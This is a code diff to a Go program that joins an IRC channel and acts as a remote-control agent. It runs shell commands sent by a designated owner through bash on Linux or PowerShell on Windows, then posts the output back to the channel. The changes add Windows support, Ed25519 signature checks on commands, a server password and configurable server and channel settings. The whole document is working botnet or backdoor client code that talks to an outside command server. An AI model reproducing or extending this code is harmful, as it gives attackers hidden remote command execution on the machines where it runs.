@@ -3,22 +3,31 @@ package main
 
 import (
 	"bufio"
+	"crypto/ed25519"
 	"crypto/tls"
+	"encoding/base64"
 	"fmt"
 	"log"
 	"math/rand"
 	"os/exec"
 	"regexp"
+	"runtime"
 	"strings"
 	"time"
 )
 
 var pingR = regexp.MustCompile(("^PING (?P<code>\\S+)$"))
 var endmotdR = regexp.MustCompile(("^:\\S+ 376 \\S+ :.*$"))
-var cmdR = regexp.MustCompile(("^:(?P<from>\\S+)!(\\S+) PRIVMSG #slop :(?P<to>\\S+): (?P<cmd>.+)$"))
+var cmdR = regexp.MustCompile(("^:(?P<from>\\S+)!(\\S+) PRIVMSG " + regexp.QuoteMeta(backendChannel) + " :(?P<to>\\S+): (?P<cmd>.+)$"))
 
 func execCmd(input string) string {
-	cmd := exec.Command("bash", "-c", input)
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "linux":
+		cmd = exec.Command("bash", "-c", input)
+	case "windows":
+		cmd = exec.Command("powershell", "-NoProfile", "-Command", input)
+	}
 	output, _ := cmd.CombinedOutput()
 	return string(output)
 }
@@ -34,17 +43,28 @@ func generateNick() string {
 }
 
 func main() {
-	conn, err := tls.Dial("tcp", "chat.rehab:6697", &tls.Config{InsecureSkipVerify: true})
+	publicKeyBytes, err := base64.StdEncoding.DecodeString(backendPubkey)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	publicKeyObject := ed25519.PublicKey(publicKeyBytes)
+
+	nick := generateNick()
+
+	conn, err := tls.Dial("tcp", backendAddr, &tls.Config{InsecureSkipVerify: true})
 	if err != nil {
 		log.Fatalln(err)
 	}
 
-	nick := generateNick()
+	if backendPass != "" {
+		fmt.Fprintf(conn, "PASS %s\r\n", backendPass)
+	}
 
 	fmt.Fprintf(conn, "USER %s 0 * :%s\r\n", nick, nick)
 	fmt.Fprintf(conn, "NICK %s\r\n", nick)
 
 	scanner := bufio.NewScanner(conn)
+	lastMsg := ""
 	for scanner.Scan() {
 		line := scanner.Text()
 		log.Println(line)
@@ -57,7 +77,7 @@ func main() {
 		}
 
 		if endmotdR.MatchString(line) {
-			fmt.Fprintf(conn, "JOIN #slop\r\n")
+			fmt.Fprintf(conn, "JOIN "+backendChannel+"\r\n")
 			continue
 		}
 
@@ -66,11 +86,19 @@ func main() {
 			from := submatches[cmdR.SubexpIndex("from")]
 			to := submatches[cmdR.SubexpIndex("to")]
 			cmd := submatches[cmdR.SubexpIndex("cmd")]
-			if from == "sniff" && (to == nick || to == "*") {
-				output := strings.Split(execCmd(cmd), "\n")
-				for _, outputline := range output {
-					fmt.Fprintf(conn, "PRIVMSG #slop :%s\r\n", outputline)
+			if from == backendOwner && (to == nick || to == "*") {
+				cmdBytes, err := base64.StdEncoding.DecodeString(cmd)
+				if err == nil {
+					if ed25519.Verify(publicKeyObject, []byte(lastMsg), []byte(cmdBytes)) {
+						output := strings.Split(execCmd(lastMsg), "\n")
+						for _, outputline := range output {
+							fmt.Fprintf(conn, "PRIVMSG "+backendChannel+" :%s\r\n", outputline)
+						}
+					} else {
+						fmt.Println("Signature did not match")
+					}
 				}
+				lastMsg = cmd
 			}
 			continue
 		}
